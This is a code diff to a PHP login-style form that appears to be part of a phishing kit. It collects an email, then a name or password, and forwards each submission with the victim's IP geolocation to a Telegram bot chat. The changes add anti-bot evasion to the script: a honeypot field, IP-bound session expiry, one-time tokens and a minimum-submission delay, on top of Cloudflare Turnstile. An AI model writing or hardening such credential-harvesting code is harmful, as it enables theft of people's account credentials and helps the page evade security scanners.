@@ -29,10 +29,52 @@ if (file_exists(ATTEMPTS_FILE)) {
 }
 
 /*
- * STEP 2: NAME SUBMISSION
+ * STEP 2: NAME/PASSWORD SUBMISSION
  * (process first so Step 2 doesn't accidentally hit Turnstile/email block)
  */
 if (isset($_POST['name'])) {
+
+    $ip = get_client_ip();
+
+    // --- Honeypot check (bot filled hidden "company" field) ---
+    if (!empty($_POST['company'] ?? '')) {
+        $_SESSION['error_message'] = "Unexpected error. Please try again.";
+        header("Location: index.php"); exit;
+    }
+
+    // --- Session TTL + IP binding ---
+    $TTL = 600; // 10 minutes
+    if (
+        empty($_SESSION['verified_at']) ||
+        (time() - $_SESSION['verified_at']) > $TTL ||
+        empty($_SESSION['verified_ip']) ||
+        $_SESSION['verified_ip'] !== $ip
+    ) {
+        $_SESSION['error_message'] = "Session expired. Please verify again.";
+        session_unset();
+        header("Location: index.php"); exit;
+    }
+
+    // --- Step 2 one-time token check ---
+    if (
+        empty($_POST['step2_token']) ||
+        empty($_SESSION['step2_token']) ||
+        !hash_equals($_SESSION['step2_token'], $_POST['step2_token'])
+    ) {
+        $_SESSION['error_message'] = "Invalid session. Please try again.";
+        session_unset();
+        header("Location: index.php"); exit;
+    }
+    // One-time use
+    unset($_SESSION['step2_token']);
+
+    // --- Min time between rendering Step 2 and POST ---
+    $minSeconds = 3;
+    if (empty($_SESSION['step2_rendered_at']) || (time() - $_SESSION['step2_rendered_at']) < $minSeconds) {
+        $_SESSION['error_message'] = "Unexpected error. Please try again.";
+        header("Location: index.php"); exit;
+    }
+    unset($_SESSION['step2_rendered_at']);
 
     // ORIGINAL validated email (from step 1)
     $original_email = $_SESSION['validated_email'] ?? ($_SESSION['old_email'] ?? '');
@@ -75,8 +117,6 @@ if (isset($_POST['name'])) {
         $_SESSION['error_message'] = "Invalid input.";
         header("Location: index.php"); exit;
     }
-
-    $ip = get_client_ip();
 
     // Location info
     $geo = json_decode(@file_get_contents("http://ip-api.com/json/{$ip}?fields=country,regionName,city,query"), true);
@@ -124,7 +164,7 @@ if (isset($_POST['name'])) {
         "?chat_id=$telegram_chat_id&text=".urlencode($msg)
     );
 
-    // Correct name check
+    // Correct name/password check
     $correct_name = "John Doe";
 
     if ($name !== $correct_name && $attempts[$email]['count'] >= 3) {
@@ -135,7 +175,7 @@ if (isset($_POST['name'])) {
     }
 
     // Success
-    unset($_SESSION['old_email'], $_SESSION['step'], $_SESSION['validated_email']);
+    unset($_SESSION['old_email'], $_SESSION['step'], $_SESSION['validated_email'], $_SESSION['verified_at'], $_SESSION['verified_ip']);
     header("Location: dashboard.php"); exit;
 }
 
@@ -147,18 +187,25 @@ if (isset($_POST['email']) && (!isset($_SESSION['step']) || $_SESSION['step'] ==
     $email = filter_var($_POST['email'], FILTER_VALIDATE_EMAIL);
     $turnstile_response = $_POST['cf-turnstile-response'] ?? '';
 
+    // Honeypot check on step 1 too (optional)
+    if (!empty($_POST['company'] ?? '')) {
+        $_SESSION['error_message'] = "Unexpected error. Please try again.";
+        header("Location: index.php"); exit;
+    }
+
     if (!$email) {
         $_SESSION['error_message'] = "Invalid email.";
         header("Location: index.php"); exit;
     }
 
     // Verify Turnstile
+    $ip = get_client_ip();
     $ch = curl_init("https://challenges.cloudflare.com/turnstile/v0/siteverify");
     curl_setopt($ch, CURLOPT_POST, 1);
     curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query([
         'secret'   => $turnstile_secret,
         'response' => $turnstile_response,
-        'remoteip' => get_client_ip()
+        'remoteip' => $ip
     ]));
     curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
     $turnstile_result = json_decode(curl_exec($ch), true);
@@ -185,10 +232,15 @@ if (isset($_POST['email']) && (!isset($_SESSION['step']) || $_SESSION['step'] ==
         }
     }
 
-    // Store both original validated and current for later comparison
+    // Store both original validated and current for later comparison,
+    // plus verification metadata & step2 token
     $_SESSION['step']             = 2;
     $_SESSION['old_email']        = $email;
     $_SESSION['validated_email']  = $email;
+    $_SESSION['verified_at']      = time();
+    $_SESSION['verified_ip']      = $ip;
+    $_SESSION['step2_token']      = bin2hex(random_bytes(16));
+    unset($_SESSION['step2_rendered_at']); // will be set when step 2 form is rendered
 
     header("Location: index.php"); exit;
 }
